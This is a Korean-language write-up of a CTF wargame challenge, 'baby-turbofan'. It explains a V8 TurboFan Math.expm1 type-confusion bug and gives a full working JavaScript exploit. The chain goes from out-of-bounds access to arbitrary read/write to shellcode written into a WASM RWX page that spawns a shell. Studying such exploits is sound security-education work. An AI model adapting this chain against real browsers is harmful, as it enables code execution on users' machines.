# baby-turbofan

## 메타데이터
- **플랫폼**: Dreamhack (https://dreamhack.io/wargame/challenges/462)
- **카테고리**: pwn (V8 Browser Exploitation)
- **출처**: 2022 Spring GoN Open Qual CTF
- **핵심 기법**: V8 TurboFan Math.expm1 타입 혼동 → OOB → AAR/AAW → WASM RWX shellcode
- **관련 문제**: 35C3 Krautflare (동일 버그, pointer compression 미적용)

## 문제 설명
V8 TurboFan JIT 컴파일러의 `Math.expm1` 타입 추론 버그를 이용한 브라우저 익스플로잇 입문 문제.
Krautflare와 동일한 취약점이지만 **pointer compression**이 적용된 버전이라 기존 exploit 재사용 불가.

## 취약점 분석

### 핵심 버그
- `Math.expm1(-0)` → 실제로 `-0` 반환
- TurboFan typer: 반환 타입을 `Union(PlainNumber, NaN)`으로 추론 (PlainNumber은 -0 제외)
- `Object.is(Math.expm1(x), -0)` → TurboFan이 항상 `false`로 추론 → bounds check 제거 → OOB

### Escape Analysis 트릭
`-0`을 직접 비교하면 상수 전파가 일찍 일어나 OOB가 안 됨.
객체 필드(`{mz: -0}`)를 통해 간접 참조하면:
1. Escape analysis가 객체를 dematerialize
2. SimplifiedLowering에서 `-0` 상수 발견
3. 이미 bounds check는 제거된 상태 → OOB 성공

## 익스플로잇 순서

1. **OOB 확보**: `Object.is(Math.expm1(x), aux.mz) * 25`로 배열 OOB → 인접 BigUint64Array length 조작
2. **Heap Base Leak**: OOB로 BigUint64Array에서 compressed pointer 읽기 → 상위 32bit = heap base
3. **addrof**: 객체 배열에 타겟 저장 → OOB로 compressed pointer 읽기
4. **AAR/AAW**: OOB로 ArrayBuffer의 `backing_store` 포인터 덮어쓰기
5. **Shellcode**: WASM 인스턴스의 RWX 페이지 주소 leak → shellcode 쓰기 → wasm 함수 호출

## 전체 Exploit 코드

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

const print = console.log

var tmp_obj = {X:1}

function itof(val) {
   u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
   u64_buf[1] = Number(BigInt(val) >> 32n);
   return f64_buf[0];
}
function hex(val){
   return "0x"+val.toString(16)
}

var oob = undefined, oo = undefined, arb = undefined
function foo(x){
   let aux = {mz:-0};
   let idx = Object.is(Math.expm1(x), aux.mz);
   let a = [0.1,0.2,0.3,0.4,0.5];
   let b = new BigUint64Array([
      0x1111111111111111n,
      0x2222222222222222n,
      0x3333333333333333n,
   ]);

   let c = [tmp_obj, 1.1, 1.2]
   let aaaa = new ArrayBuffer(0x1338);

   oob = b
   oo = c
   arb = aaaa

   idx *= 25;
   a[idx] = itof(0xFFFFFFFF000023e8n)
   return a[idx];
}

foo(0);
for(let i = 0; i < 100000; i++) {
    foo("0");
}

foo(-0)

const base = (BigInt(oob[9]) & 0xFFFFFFFFn) << 32n
print("HEAP BASE : " + hex(base))

function addrof(obj) {
   oo[0] = obj
   return base + (oob[13] & 0xFFFFFFFFn)
}

function aar(addr) {
   oob[20] = addr
   let buf = new BigUint64Array(arb);
   return buf[0];
}

function aaw(addr, value) {
   oob[20] = addr

   if(typeof value == "number") {
      let buf = new BigUint64Array(arb);
      buf[0] = value
   }

   else if(typeof value == "string") {
      let buf = new Uint8Array(arb);
      for(let i = 0; i < value.length; i++) {
         buf[i] = value[i].charCodeAt();
      }
   }
}

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
let wasmFunction = wasmInstance.exports.main;

const Instance = addrof(wasmInstance)
const rwx = aar(addrof(wasmInstance)+0x5Fn)
print("RWX : "+hex(rwx))

let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";

aaw(rwx, shellcode)

wasmFunction()
```

## 주요 오프셋 (동적 디버깅 필요)
- `oob[9]`: BigUint64Array 근처에서 heap base가 포함된 값
- `oob[13]`: 객체 배열의 첫 번째 요소 (compressed pointer)
- `oob[20]`: ArrayBuffer의 backing_store 포인터 위치
- `wasmInstance + 0x5F`: RWX 페이지 주소 (버전마다 다름)

## 핵심 교훈
1. **Pointer compression** 때문에 기존 V8 exploit을 그대로 재사용할 수 없음 → 동적 디버깅 필수
2. OOB → 인접 객체 메타데이터 조작은 V8 exploit의 보편적 패턴
3. WASM RWX 페이지는 V8 exploit의 표준 code execution primitive
4. 오프셋(9, 13, 20, 0x5F)은 V8 버전과 힙 레이아웃에 따라 달라짐 → `%DebugPrint` + GDB로 확인

## 참고 자료
- [g0riya 라이트업](https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/#k-baby-turbofan---pwnable)
- [Math.expm1 버그 상세 분석 (abiondo)](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/)
- [35C3 Krautflare 라이트업](https://sunrinjuntae.tistory.com/171)
- [DownUnder - Is this pwn or web?](https://sunrinjuntae.tistory.com/172)
